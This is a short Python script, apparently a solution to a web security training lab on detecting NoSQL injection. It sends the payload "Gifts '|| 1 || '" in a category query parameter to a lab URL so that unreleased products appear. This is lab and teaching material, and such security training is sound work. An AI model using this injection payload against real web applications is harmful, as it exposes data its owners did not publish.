#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 29/9/2023
#
# Lab: Detecting NoSQL injection
#
# Steps: 1. Inject payload into "category" query parameter to retrieve
#           unreleased products
#        2. Observe unreleased products in the response
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0aef00f5036c78c7a7a51d88007a003a.web-security-academy.net"

print(Fore.BLUE + "❯ Injection parameter: " + Fore.YELLOW + "category")

# payload to retrieve unreleased products
payload = f"Gifts '|| 1 || '"

try:  
    # inject payload in category parameter
    injection = requests.get(f"{url}/filter?category={payload}")
    
except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯ Injecting payload to retrieve unreleased products.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
